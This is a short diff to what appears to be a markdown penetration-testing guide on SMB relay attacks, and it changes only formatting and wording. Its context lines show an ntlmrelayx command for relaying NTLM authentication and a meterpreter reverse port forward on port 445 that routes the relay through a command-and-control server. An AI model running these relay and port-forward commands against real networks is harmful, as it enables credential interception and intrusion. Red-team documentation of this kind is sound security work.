@@ -73,7 +73,7 @@ $ nc 127.0.0.1 <PORT>
 
 ##### 1.3.2.1 - Hijack Host and Setup MITM
 
-- Disable SMB to spoof the targets via proxychains
+Disable SMB to spoof the targets via proxychains
 
 ```
 $ sudo ntlmrelayx.py -t smb://<target_IP> -smb2support -socks
@@ -97,9 +97,11 @@ C:\> exit
 
 Add a reverse port forward to 445 to relay SMB attack via the command and control server (metasploit)
 
-`meterpreter > portfwd add -R -L <bind_target_IP> -l 445 -p 445`
+```
+meterpreter > portfwd add -R -L <bind_target_IP> -l 445 -p 445
+```
 
-- Cleanup
+Revert back the settings.
 
 ```
 meterpreter > shell
